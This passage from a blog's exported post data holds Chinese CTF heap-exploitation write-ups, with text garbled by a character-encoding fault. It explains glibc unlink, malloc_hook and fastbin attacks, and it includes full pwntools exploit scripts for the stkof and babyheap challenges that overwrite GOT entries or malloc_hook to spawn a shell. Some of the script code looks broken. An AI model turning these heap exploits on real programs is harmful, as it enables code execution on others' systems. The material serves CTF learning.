binä¸­çš„å‰é©±åç»§ï¼Œå°†å‰é©±çš„åç»§ï¼ˆåŸæœ¬æ˜¯chunk1ï¼‰æ”¹æˆè‡ªå·±çš„åç»§ï¼Œå°†åç»§çš„å‰é©±ï¼ˆåŸæœ¬æ˜¯chunk1ï¼‰æ”¹æˆè‡ªå·±çš„å‰é©±ã€‚è€Œç³»ç»Ÿæ˜¯æ€ä¹ˆä¿®æ”¹å‰é©±åç»§çš„å‘¢ï¼Œå°±æ˜¯ä¿®æ”¹FDæŒ‡é’ˆ + 8çš„åœ°å€ï¼ˆheap head å 8ä¸ªå­—èŠ‚ï¼Œç´§æ¥ç€å°±æ˜¯è¯¥chunkçš„fdæŒ‡é’ˆï¼‰å’Œä¿®æ”¹FDæŒ‡é’ˆ + 12çš„åœ°å€ï¼ˆheap headå 8 Bytesï¼Œfdå 4 Bytesï¼Œç´§æ¥ç€å°±æ˜¯è¯¥chunkçš„bkæŒ‡é’ˆï¼‰ã€‚ â€‹ 5.æ‰€ä»¥ç³»ç»Ÿä¼šå°†chunk1çš„FDâ€“&gt;bkæ”¹æˆè‡ªå·±çš„BKï¼Œå°†BKâ€“&gt;fdæ”¹æˆè‡ªå·±çš„FDï¼Œæ¢å¥è¯è¯´å°±æ˜¯ã€‚ 12FD-&gt;bk=BK; //target_addr - 12 + 12 = expect value;BK-&gt;fd=FD; //expect value + 8 = target_addr; â€‹ è¿™æ ·å°±å®ç°äº†ä»»æ„å†™ã€‚ C . å¦‚ä»Šçš„æ¼æ´åˆ©ç”¨ ï¼ˆ64 bitï¼‰â€‹ ä½†æ˜¯ç°åœ¨çš„glibcåŠ å¼ºäº†ä¿æŠ¤æœºåˆ¶ï¼Œå¢åŠ äº†ä»¥ä¸‹æ£€æŸ¥è¿‡ç¨‹ã€‚ 123// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\ â€‹ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¿…é¡»ä½¿å¾—chunk1å‰é©±çš„åç»§ï¼Œå’Œåç»§çš„å‰é©±éƒ½æŒ‡å‘åŒä¸€ä¸ªpã€‚è‡³äºpæ˜¯å•¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹å½“ç„¶æ˜¯chunk1å’¯ï¼Œä½†æ˜¯æ—¢ç„¶è¦æ¼æ´åˆ©ç”¨ï¼Œé‚£å½“ç„¶ä¸èƒ½é¡ºç€ç³»ç»Ÿæœºåˆ¶æ¥ã€‚ â€‹ æˆ‘ä»¬è¿›è¡Œå¦‚ä¸‹æ„é€ ï¼š 12chunk1-&gt;FD = p - 0x18;chunk1-&gt;BK = p - 0x10; â€‹ é‚£ä¹ˆç³»ç»Ÿæ£€æŸ¥æ—¶å°±ä¼šè¿›è¡Œå¦‚ä¸‹åˆ¤æ–­ï¼š 12chunk1-&gt;FD-&gt;bk == chunk1-&gt;BK-&gt;fd ; //bingo!! p - 0x18 + 0x18 == p - 0x10 +0x10; // We pass!! â€‹ æ—¢ç„¶æ£€æŸ¥è¿‡äº†ï¼Œå°±è¿›è¡Œunlinkå§ã€‚ 12chunk1-&gt;FD-&gt;bk = chunk1-&gt;BK; //p - 0x18 + 0x18 = p - 0x10chunk1-&gt;BK-&gt;fd = chunk1-&gt;FD; //p - 0x10 + 0x10 = p - 0x18 â€‹ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æŠŠpæŒ‡é’ˆå‘å‰åç§»äº†0x18ã€‚è™½ç„¶ä¸ç®—æ˜¯ä»»æ„å†™ï¼Œä½†ä¹Ÿè¶³å¤Ÿåˆ©ç”¨äº†ã€‚ 0x01 . stkof writeupA . ç¨‹åºåˆ†æ â€‹ useless()çš„åŠŸèƒ½å¤§æ¦‚æ˜¯ç”¨æ¥æµ‹è¯•ç”¨æˆ·è¾“å‡ºçš„chunkåºå·æ˜¯å¦å·²åˆ†é…ï¼Œä»…æ­¤è€Œå·²ã€‚åœ¨ä¸»å‡½æ•°é‡Œæ²¡æœ‰æ‰¾åˆ°å¯ä»¥è¾“å‡ºçš„å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘è¦†å†™gotè¡¨æ¥leak libcã€‚ â€‹ è‡³äºå…¶ä»–å‡½æ•°ï¼š add()æ²¡ä»€ä¹ˆç‰¹åˆ«çš„ã€‚ delete()ä¸­free()åæœªå°†æŒ‡é’ˆç½®ç©º fill()ä¸­å†è®©ç”¨æˆ·è¾“å…¥ä¸€ésizeï¼Œä¸åŒäºadd()ä¸­çš„sizeï¼Œå› æ­¤å¯ä»¥å †æº¢å‡ºã€‚ â€‹ åœ¨æœ¬ç¨‹åºçš„å‡ ä¸ªé‡è¦å‡½æ•°ä¸­å¯ä»¥å¯ä»¥å‘ç°ï¼Œchunkçš„å †æŒ‡é’ˆè¢«å­˜æ”¾åœ¨äº†ä¸€ä¸ªæ•°ç»„s[ ]ä¸­ï¼Œè€ŒåŒå‡»æ•°ç»„så¯ä»¥å‘ç°ï¼Œå…¶åœ°å€æ˜¯0x0602140ï¼Œå®ƒæ˜¯ä¸€ä¸ªä½äºbssæ®µçš„æŒ‡é’ˆæ•°ç»„ï¼Œæ¢è¨€ä¹‹æ˜¯ä¸€ä¸ªå¯å†™çš„å…¨å±€å˜é‡ã€‚sæ˜¯æˆ‘ä»¬è¦†å†™gotè¡¨çš„å…³é”®ã€‚ â€‹ æœ‰å…¨å±€å˜é‡å­˜åœ¨ï¼Œå¯ä»¥åˆ©ç”¨unlinkæ¼æ´è¦†å†™gotè¡¨äº†ã€‚ B .å†…å­˜å¸ƒå±€ ç”³è¯·4ä¸ªchunkï¼Œå…¶ä¸­chunk2æ˜¯small chunkã€‚ï¼ˆæœ¬ç¨‹åºæ²¡æœ‰ç”³è¯·é™åˆ¶ï¼Œå¯ä»¥ç”³è¯·å¤šä¸€ç‚¹ï¼Œåªè¦æ–¹ä¾¿å¸ƒå±€ã€‚ï¼‰ ç”¨chunk1çš„å †æº¢å‡ºè¦†ç›–chunk2ï¼Œæ”¹å†™å…¶FDå’ŒBKæˆs[0]-0x10(å³chunk2æŒ‡é’ˆ)ï¼Œæ”¹å†™chunk3çš„å¤´ä¿¡æ¯ã€‚ åœ¨ä¸Šä¸€æ­¥å®Œæˆçš„åŒæ—¶è¦é€šè¿‡æ£€æŸ¥ï¼Œä½¿ç³»ç»Ÿåœ¨é‡Šæ”¾chunk3æ—¶ç›¸ä¿¡chunk2ä¹Ÿå·²ç»é‡Šæ”¾äº†ï¼Œä»è€Œå‘å‰åˆå¹¶ã€‚ è¿™ä¸€åˆå¹¶ä¸è¦ç´§ï¼Œç³»ç»Ÿä¸€ä¸å°å¿ƒå°±æŠŠchunk2å¤„çš„å­˜æ”¾çš„æŒ‡é’ˆå‘ä½åœ°å€åç§»äº†0x18ï¼Œå¤Ÿæˆ‘ä»¬åœ°è‚†æ— å¿Œæƒ®å‘æŒ¥äº†ã€‚ C . Leak &amp; Getshell å†æ”¹å†™chunk2çš„å†…å®¹ï¼Œå®é™…ä¸Šå°±æ˜¯è¦†å†™sæ•°ç»„ï¼Œæ”¹å†™chunkæŒ‡é’ˆã€‚æ­¤æ—¶å¯å†™å…¥gotè¡¨åœ°å€äº†ã€‚ è¦†å†™æƒ…å†µï¼šs[0]=free@got,s[1]=puts@got,s[2]=atol@gotã€‚ å†åˆ©ç”¨fillå‡½æ•°å°†free@gotæ”¹æˆputs@gotï¼Œfree[1]å°±å¾—åˆ°äº†puts@pltã€‚ é€šè¿‡è®¡ç®—ï¼Œå¾—åˆ°libcåœ°å€å’Œsystemåœ°å€ï¼Œé€šè¿‡elfæ–‡ä»¶æœç´¢å¯ä»¥æ‰¾åˆ°â€œ/bin/shâ€ã€‚ åˆ©ç”¨filå°†atol@gotæ”¹å†™æˆsystemåœ°å€ã€‚ æœ€åç›´æ¥å‘é€â€/bin/shâ€éƒ½ä¼šè°ƒç”¨systemå‡½æ•°ï¼Œgetshellã€‚ D . Expâ€‹ è´´ä¸€ä¸‹è„šæœ¬å‘—ï¼Œè™½ç„¶ä¸æ˜¯è‡ªå·±å†™çš„ã€‚ï¼ˆexp from ctf-wikiï¼‰æœ‰ç©ºå†è‡ªå·±å†™ä¸€éã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]if args[&#x27;DEBUG&#x27;]: context.log_level = &#x27;debug&#x27;context.binary = &quot;./stkof&quot;stkof = ELF(&#x27;./stkof&#x27;)if args[&#x27;REMOTE&#x27;]: p = remote(&#x27;127.0.0.1&#x27;, 7777)else: p = process(&quot;./stkof&quot;)log.info(&#x27;PID: &#x27; + str(proc.pidof(p)[0]))libc = ELF(&#x27;./libc.so.6&#x27;)head = 0x602140def alloc(size): p.sendline(&#x27;1&#x27;) p.sendline(str(size)) p.recvuntil(&#x27;OK\\n&#x27;)def edit(idx, size, content): p.sendline(&#x27;2&#x27;) p.sendline(str(idx)) p.sendline(str(size)) p.send(content) p.recvuntil(&#x27;OK\\n&#x27;)def free(idx): p.sendline(&#x27;3&#x27;) p.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 # begin alloc(0x30) # idx 2 # small chunk size in order to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who&#x27;s size is 0x20 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head + 16 - 0x18) #fd payload += p64(head + 16 - 0x10) #bk payload += p64(0x20) # next chunk&#x27;s prev_size bypass the check payload = payload.ljust(0x30, &#x27;a&#x27;) # overwrite global[3]&#x27;s chunk&#x27;s prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) p.recvuntil(&#x27;OK\\n&#x27;) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = &#x27;a&#x27; * 8 + p64(stkof.got[&#x27;free&#x27;]) + p64(stkof.got[&#x27;puts&#x27;]) + p64( stkof.got[&#x27;atoi&#x27;]) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(stkof.plt[&#x27;puts&#x27;]) edit(0, len(payload), payload) # free global[1] to leak puts addr free(1) puts_addr = p.recvuntil(&#x27;\\nOK\\n&#x27;, drop=True).ljust(8, &#x27;\\x00&#x27;) puts_addr = u64(puts_addr) log.success(&#x27;puts addr: &#x27; + hex(puts_addr)) libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;] binsh_addr = libc_base + next(libc.search(&#x27;/bin/sh&#x27;)) system_addr = libc_base + libc.symbols[&#x27;system&#x27;] log.success(&#x27;libc base: &#x27; + hex(libc_base)) log.success(&#x27;/bin/sh addr: &#x27; + hex(binsh_addr)) log.success(&#x27;system addr: &#x27; + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) p.send(p64(binsh_addr)) p.interactive()if __name__ == &quot;__main__&quot;: exp()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"Malloc_Hookå°è®°","slug":"Malloc-Hook","date":"2020-03-01T07:09:47.000Z","updated":"2021-03-24T09:46:47.705Z","comments":true,"path":"2020/03/01/Malloc-Hook/","link":"","permalink":"http://example.com/2020/03/01/Malloc-Hook/","excerpt":"â€‹ malloc_hookçš„ä»‹ç»ä»¥åŠç”¨å †è¿›è¡Œmalloc_hookæ”»å‡»ã€‚","text":"â€‹ malloc_hookçš„ä»‹ç»ä»¥åŠç”¨å †è¿›è¡Œmalloc_hookæ”»å‡»ã€‚ â€‹ æ˜¨å¤©çš„babyheapç®—æ˜¯ç¢°ä¸Šçš„ç¬¬ä¸€ä¸ªmalloc_hookåˆ©ç”¨ï¼Œè€Œä¸”çœ‹è¿™ä¹ˆç®€å•çš„åç§»éƒ½çœ‹ä¸æ˜ç™½ï¼Œè¿˜æ˜¯è®°ä¸€ä¸‹å§ã€‚ 0x00 å…³äºmalloc_hookâ€‹ malloc_hookæ˜¯ä¸€ä¸ªä½äºmain_arenaé™„è¿‘çš„å‡½æ•°æŒ‡é’ˆã€‚ â€‹ å½“ç³»ç»Ÿè°ƒç”¨mallocï¼Œfreeå‡½æ•°æ—¶ï¼Œä¼šå¯¹æ­¤æŒ‡é’ˆè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæŒ‡é’ˆéç©ºåˆ™è·³è½¬åˆ°è¯¥åœ°å€å¹¶æ‰§è¡Œã€‚æ‰€ä»¥ï¼Œå°†shellcodeæˆ–è€…system(â€œ/bin/shâ€)çš„åœ°å€å†™å…¥åˆ°malloc_hookä¸­å†æƒ³åŠæ³•è°ƒç”¨æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„getshellæ€è·¯ã€‚ 0x01 malloc_hookä½ç½®â€‹ malloc_hookä½äºmain_arena(å¦‚æœä¸çŸ¥é“main_arenaåœ°å€å¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤ x/20xg &amp;main_arena æŸ¥çœ‹å†…å­˜å’Œåœ°å€)å¾€ä¸Šï¼Œoffset = 0x10: â€‹ ä¸€èˆ¬æ¥è¯´malloc_hookä¸ºç©ºï¼Œä½†æ˜¯æœ‰ä¸€æ¬¡å¶ç„¶å‘ç°äº†malloc_hookæœªè¢«æ”»å‡»å´æœ‰å€¼ï¼Œåæ¥æ‰å‘ç°æ˜¯ç¨‹åºè¿˜æ²¡æœ‰åˆå§‹åŒ–ã€‚ 0x03 malloc_hookæ”»å‡»A.å¦‚ä½•å†™å…¥â€‹ å¦‚æœç¨‹åºä¸­å­˜åœ¨ä»»æ„å†™çš„æ¼æ´ï¼Œåˆ™ç”¨æˆ·å¯ä»¥å¾ˆå®¹æ˜“çš„è¿›è¡Œmalloc_hookæ”»å‡»ã€‚è¿™é‡Œç”¨å †åšä¸€ä¸ªå®ä¾‹ï¼ˆå®é™…ä¸Šä¹Ÿé€šå¸¸ç”¨å †ï¼‰ã€‚å°±fastbin attackæ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬æ”¹å†™chunkçš„fdï¼Œä½¿å…¶æŒ‡å‘malloc_hookä¸Šæ–¹ä¸€å®šåç§»å¤„ï¼Œå°±å¯ä»¥å¡«å……å¹¶å†™å…¥malloc_hookã€‚æ‰€ä»¥é—®é¢˜çš„å…³é”®å°±æ˜¯æˆ‘ä»¬è¦åœ¨å“ªå„¿åˆ›å»ºå †ï¼Œåˆ›å»ºå¤šå¤§çš„å †ï¼Œå¦‚ä½•å¡«å……æ•°æ®ã€‚ B.ç”¨å †getshellâ€‹ 1.é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œåˆ›å»ºå †æ—¶å¡«å……æ•°æ®çš„ä½ç½®åœ¨chunk_ptr + 0x10ï¼ˆå³free chunkçš„FD BKæŒ‡é’ˆå¤„ï¼‰çš„ä½ç½®ï¼Œè€Œå‰é¢0x10ç”¨æ¥å­˜æ”¾å †ç»“æ„çš„éƒ¨åˆ†ä¿¡æ¯ï¼Œå…¶ä¸­å¾ˆé‡è¦çš„ä¸€ä¸ªä¿¡æ¯å°±æ˜¯chunk_sizeã€‚åœ¨åˆ›å»ºå †æ—¶chunk_sizeæ˜¯é¿å…æ£€æŸ¥ï¼Œå†³å®šå¡«å……åç§»çš„å…³é”®ã€‚ â€‹ 2.ç”±æ­¤æˆ‘ä»¬éœ€è¦åœ¨malloc_hooké™„è¿‘æ‰¾ä¸€ä¸ªåˆé€‚çš„â€œchunk_sizeâ€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨è¯¥åœ°å€å¤„çš„æ•°æ®å……å½“chunk_sizeï¼Œè€Œä¸”è¦è®©å…¶æ»¡è¶³fastchunkçš„å¤§å°ã€‚ç»è¿‡å®éªŒï¼Œå¯ä»¥æ‰¾åˆ°main_ arena - 0x40 + 0xd è¿™ä¸ªä½ç½®ï¼ˆä¸ç†è§£çš„è¯å¯ä»¥0x0 â€“ 0x10 éƒ½è¯•ä¸€ä¸‹ï¼Œæ‰¾æœ€åˆé€‚çš„åç§»ï¼‰ã€‚ â€‹ åœ¨æ­¤åç§»å¤„çš„0x7fè¿™ä¸ªå­—èŠ‚æ°å¥½æ»¡è¶³éœ€æ±‚ï¼Œå±äºfastchunkã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªåœ°å€mallocï¼ˆ0x60ï¼‰ï¼Œç³»ç»Ÿå°±ä¼šç»™æˆ‘ä»¬åˆ†é…0x70çš„ç©ºé—´ï¼Œä¹Ÿæ»¡è¶³0x7fçš„chunksizeã€‚ â€‹ 3.ç”³è¯·å¥½chunkä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“åç§»é‡ã€‚å‡è®¾æˆ‘ä»¬å·²ç»leakå‡ºäº†libc_baseï¼Œé‚£ä¹ˆå°±å¯ä»¥æ ¹æ®main_arenaåœ¨libcä¸Šçš„å›ºå®šåç§»å¹¶é€šè¿‡è®¡ç®—å¾—çŸ¥ä»¥ä¸‹å…³ç³»ï¼š 1234567main_arena == libc_base + 0x3c4b20 chunk_addr == main_arena - 0x40 + 0xdchunk_addr == libc_base + 0x3c4b20 - 0x40 + 0xdchunk_addr == libc_base + 0x3c4aedmalloc_hook== main_arena - 0x10fill_size == malloc_hook - chunk_addrfill_size == 0x23 â€‹ æ‰€ä»¥è¯´æˆ‘ä»¬éœ€è¦å¡«å……çš„å¤§å°å°±æ˜¯0x23ã€‚ 123payload = &#x27;A&#x27; * 3payload +=p64(0)payload +=p64(shellcode) â€‹ 4.å¡«å……å¥½ä¹‹åï¼Œå†è¿›è¡Œä¸€æ¬¡malloc()å°±å¯ä»¥getshelläº†ã€‚","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"Fastbin attack (Babyheap)","slug":"Fastbin_attack(Babyheap)","date":"2020-02-29T13:09:47.000Z","updated":"2021-03-24T09:49:52.110Z","comments":true,"path":"2020/02/29/Fastbin_attack(Babyheap)/","link":"","permalink":"http://example.com/2020/02/29/Fastbin_attack(Babyheap)/","excerpt":"â€‹ åˆ©ç”¨malloc_hookè§£é¢˜ã€‚","text":"â€‹ åˆ©ç”¨malloc_hookè§£é¢˜ã€‚ 1.å…³äºFast_binâ€‹ fast binå’Œå…¶ä»–çš„binä¸€æ ·ï¼Œéƒ½æ˜¯ä¸€ç§ç”¨æ¥è®°å½•free chunkçš„é“¾è¡¨æ•°æ®ç»“æ„æœ‰å•é“¾è¡¨æœ‰åŒé“¾è¡¨ï¼Œå› ç§ç±»ä¸åŒåŠŸèƒ½ä¸åŒè€Œé‡‡ç”¨ä¸åŒçš„ç»“æ„ã€‚fast binä¸“é—¨ä½¿ç”¨äºå­˜æ”¾æ¯”è¾ƒå°çš„chunkï¼Œå…·ä½“ä¸º16 bytes â€“ 80 bytesï¼ˆæ­¤å¤„æŒ‡mallocçš„å®é™…å¤§å°ï¼‰fast binçš„è®¾è®¡åˆè¡·å°±æ˜¯è¿›è¡Œå¿«é€Ÿçš„å°å†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼Œå› æ­¤fast chunkä¹‹é—´æ˜¯ä¸è¿›è¡Œåˆå¹¶çš„ï¼Œå³ä¸å­˜åœ¨unlinkã€‚å› æ­¤å…¶ next_chunk çš„ prev_inuse ä½ä¹Ÿä¸ä¼šè¢«æ¸…ç©ºã€‚ï¼Œä¹Ÿå°±å‚¬ç”Ÿäº†fast binçš„æ¼æ´ã€‚ 2.babyheapå¤ç°A.é¢˜ç›®åˆ†æ Link â€“ https://uaf.io/assets/0ctfbabyheap å¸¸è§„æ“ä½œï¼šä¸¢ubuntuåˆ†æï¼šä¿æŠ¤å…¨å¼€ï¼Œä¸€èˆ¬éƒ½æ˜¯å †é¢˜ã€‚ã€‚ ä¸¢ida_64åˆ†æï¼š 123456789101112131415161718192021222324252627282930__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char *v4; // [rsp+8h] [rbp-8h] v4 = sub_B70(); while ( 1 ) &#123; menu(); Read(); switch ( off_14F4 ) &#123; case 1uLL: Add(v4); break; case 2uLL: Fill(v4); break; case 3uLL: Free(v4); break; case 4uLL: Dump(v4); break; case 5uLL: return 0LL; default: continue; &#125; &#125;&#125; Add()ï¼šæ–°å»ºchunk,ç”±ç”¨æˆ·è¾“å…¥size,ç”¨callocåˆ†é…å†…å­˜,å…ˆè¡Œåˆå§‹åŒ–chunkã€‚ Fill()ï¼šå†™å…¥chunk,ç”±ç”¨æˆ·å†³å®šsizeï¼Œä¸Add()sizeä¸åŒ,æ‰€ä»¥å­˜åœ¨å †æº¢å‡ºã€‚ Free()ï¼šåˆ é™¤chunk,è€Œä¸”æŒ‡é’ˆç½®ç©º,ä¸å­˜åœ¨UAFæ¼æ´ã€‚ Dump()ï¼šè¾“å‡ºchunk,æ²¡å•¥ç‰¹åˆ«ã€‚ å¦å¤–è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œæ–‡ä»¶å­˜åœ¨alarm()å‡½æ•°ï¼Œå› æ­¤åœ¨è°ƒè¯•æ—¶æœ‰æ—¶é—´é™åˆ¶ã€‚ ä¸è¿‡åªè¦åœ¨ä¼ªä»£ç ä¸­ï¼Œå°†æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹ä¸€ä¸‹ï¼Œå°†call alarmæ”¹æˆnopå°±è¡Œã€‚ æ‰€ä»¥è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„åªæœ‰å †æº¢å‡ºè¿™ä¸€ä¸ªæ¼æ´ã€‚ B.Leak Libc_baseå¯¹äºè¿™ä¸ªé¢˜ç›®å¯ä»¥è¿›è¡Œfastbin_attack,å…ˆæ–°å»º5ä¸ªchunkï¼Œå¤§å°åŠŸèƒ½å¦‚ä¸‹ã€‚ 12345 Add(0x20) #used for overwrite Add(0x20) Add(0x20) #used to point the same aera of chunk4 Add(0x20) #used for overwriteAdd(0x80) #used to leak the libc_base å„ä¸ªå †å—ç»“æ„å¦‚ä¸‹ï¼š â€‹ æ ¹æ®å †ç»“æ„ï¼Œå¡«å……ç©ºä½™éƒ¨åˆ†æ—¶è¦è¿™æ ·å†™è„šæœ¬ï¼š 12 payload = p64(0) * 5 + p64(31)payload+= p64(0) * 5 + p64(31) + p8(0xC0) â€‹ p8(0xC0)ä¹Ÿå°±åˆšå¥½è¦†ç›–åˆ°äº†chunk2çš„FDæŒ‡é’ˆã€‚æ¥ç€å°±æ˜¯ä¸€ç³»åˆ—å†…å­˜å¸ƒå±€ï¼Œç›®çš„æ˜¯è®©leakå‡ºsmall chunk2çš„FDæŒ‡é’ˆï¼Œå› ä¸ºå½“ç¨‹åºä¸­åªæœ‰ä¸€ä¸ªsmall/unsort chunkåœ¨é“¾è¡¨ä¸Šæ—¶ï¼Œå…¶FDå’ŒBKéƒ½æŒ‡å‘è·ç¦»main_arena 0x58çš„åœ°å€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼š Leak_addr - 0x58 = main_arena main_arena - 0x3c4b20 = libc_base å†…å­˜å¸ƒå±€å¦‚ä¸‹(éå®é™…è„šæœ¬ï¼Œä»…ç”¨äºç†è§£)ï¼š 123456789101112 free(chunk1) main_arena--&gt;chunk1 free(chunk2) main_arena--&gt;chunk2--&gt;chunk1 fill(chunk0) main_arena--&gt;chunk2--&gt;chunk4 #overwrite fill(chunk3) #modify the size of chunk4 (0x91 --&gt; 0x31) #so we can malloc chunk4 as fastbin add(0x20) main_arena--&gt;chunk4&lt;--chunk2 add(0x20) main_arena chunk4&lt;--chunk2 #share the same addr fill(chunk3) #modify the size of chunk4 (0x91 --&gt; 0x31)#so we can pass the check and free chunk4 as smallbin add(0x80) #chunk 5 , for avoiding the merging into top_chunkfree(chunk4) main_arena-0x58&lt;--chunk4&lt;--chunk2 dump(chunk2) #Leak libc_base â€‹ ç»è¿‡å¸ƒå±€ä¹‹åå¯ä»¥ä½¿å¾—chunk2å’Œchunk4æŒ‡å‘ç›¸åŒã€‚ C. Getshellâ€‹ é‚£ä¹ˆç°åœ¨æœ‰äº†libc_baseè¦æ€ä¹ˆåˆ©ç”¨å’§ã€‚å¯ä»¥é€šè¿‡one_gadgetæœlibcé‡Œçš„excute(â€œ/bin/shâ€)ï¼Œæœå‡ºæ¥çš„ä¸æ­¢ä¸€ä¸ªï¼Œéœ€è¦ä¸€ä¸ªä¸ªå°è¯•ï¼Œå†æ‰¾æœºä¼šè°ƒç”¨è¿è¡Œã€‚ä»Šå¤©æ–°å­¦åˆ°çš„ä¸€ä¸ªå°å§¿åŠ¿ï¼šmain_arenaä¸Šæ–¹æœ‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆå«malloc_hookï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¸ºç©ºï¼Œä½†å¦‚æœç³»ç»Ÿåœ¨è°ƒç”¨mallocï¼Œ reallocï¼Œfreeæ—¶ç›‘æµ‹åˆ°malloc_hookéç©ºå°±ä¼šç«‹å³æ‰§è¡Œmalloc_hookä¸­çš„æ±‡ç¼–æŒ‡ä»¤ã€‚é’ˆå¯¹malloc_hookçš„æ”»å‡»ä¼šå¦å¤–å†å†™ä¸€ç¯‡å°è®°ã€‚ â€‹ æ‰€ä»¥è¯´åˆ©ç”¨æ€è·¯å°±æ˜¯ï¼šå¯ä»¥åˆ©ç”¨å †ï¼Œä¿®æ”¹å †çš„FDæŒ‡é’ˆæŒ‡å‘malloc_hookçš„ä¸€å®šåç§»å¤„ï¼Œä½¿å¾—fill(chunk)æ—¶å¯ä»¥æ°å¥½è¦†ç›–åˆ°malloc_hookå¹¶æ‰§è¡Œã€‚ å°†chunk4ç”³è¯·å‡ºæ¥å¹¶å°†å…¶å¤§å°å‹ç¼©åœ¨fastchunkçš„èŒƒå›´ã€‚ é‡Šæ”¾chunk4ï¼Œæ­¤æ—¶ç”¨chunk2è¦†å†™chunk4çš„FDæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘è·ç¦»malloc_hookçš„ä¸€å®šåç§»å¤„ã€‚(å‡†ç¡®åœ°å€ä¸ºlibc_base+0x3C4AEDï¼Œåœ¨æ­¤å¤„æ°å¥½å¯ä»¥åˆ†é…åˆ°åˆé€‚çš„fastbinï¼Œè¿™é‡Œçš„åç§»è®¡ç®—æ¶‰åŠmalloc_hookæ”»å‡»ã€‚) ç”³è¯·ä¸¤ä¸ªchunk(fastchunk)ï¼Œç¬¬ä¸€æ¬¡ä¼šåˆ†é…åˆ°chunk4ï¼Œç¬¬äºŒæ¬¡ä¼šåˆ†é…åˆ°æ–°çš„chunk6ï¼Œchunk6çš„åœ°å€æ­£æ˜¯ç›®æ ‡åœ°å€ã€‚ å°†shellcodeå†™å…¥åˆ°chunk6ã€‚ æ‰§è¡Œä¸€æ¬¡add()å³å¯getshellã€‚ D.Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import *context.log_level = &quot;debug&quot;p = process(&#x27;./babyheap&#x27;)env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;def add(size): p.sendlineafter(&quot;Command: &quot;,str(1)) p.sendlineafter(&quot;Size: &quot;,str(size)) def fill(index,content): p.sendlineafter(&quot;Command: &quot;,str(2)) p.sendlineafter(&quot;Index: &quot;,str(index)) p.sendlineafter(&quot;Size: &quot;,str(len(content))) p.sendlineafter(&quot;Content: &quot;,content)def free(): p.sendlineafter(&quot;Command: &quot;,str(3)) p.sendlineafter(&quot;Index: &quot;,str(index)) def dump(): p.sendlineafter(&quot;Command: &quot;,str(4)) p.sendlineafter(&quot;Index: &quot;,str(index)) return p.recvline()add(0x20) #used for overwrite 0x..............00add(0x20) # 0x..............30add(0x20) #used to point the same aera of chunk4 0x..............60add(0x20) #used for overwrite 0x..............90add(0x80) #used to leak the libc_base 0x..............C0free(1)free(2)payload = p64(0) * 5payload+=p64(0x31)payload+=p64(0) * 5payload+=p64(0x31)payload+=p64(0xC0)fill(0,payload) #now the chunk2 is pointing at the chunk4, they share the same addr#In order to draw the chunk4 into fastbin ,its size need to be modifiedpayload = p64(0) * 5payload+=p64(0x31)fill(3,payload) #now the size of chunk4 is 0x30,we can easily malloc it as a fastchunkadd(0x20) #chunk2add(0x20) #chunk4#In order to put the chunk4 into smallbin ,its size need to be modifiedpayload = p64(0) * 5payload+=p64(0x91)fill(3,payload) #now the size of chunk4 is 0x90,we can easily free it as a smallchunkadd(0x80) #avoid merging into top_chunk :chunk5free(4) #here we&#x27;ve got the fd ptr of chunk4,which is pointing at main_arena-0x58 while it was freedfd_ptr = u64(dump(2)[:8])main_arena = fd_ptr - 0x58libc_base = main_arena - 0x3c4b20 #0x3c4b20 is the offset of main_arena in libcadd(0x60) #transform the chunk4 into fastchunk again,so we are able to fastbin attackfree(4) payload = p64(0) * 5payload+=p64(main_arena - 0x33) #the same as : malloc_hook-0x23 || libc_base+0x3C4B20-0x33 || libc_base - 0x3C4AEDfill(3,payload)add(0x60) #chunk 4add(0x60) #chunk 6payload = &#x27;A&#x27;*3 #length of &quot;AAA&quot;+p64(0)*2 = 0x23,it&#x27;s the very length to fill the malloc_hookpayload+=p64(0) * 2payload+=p64(libc_base + 0x4526a)fill(6,payload)add(1) #add() to call excute(&quot;/bin/sh&quot;) &quot;1&quot;has not 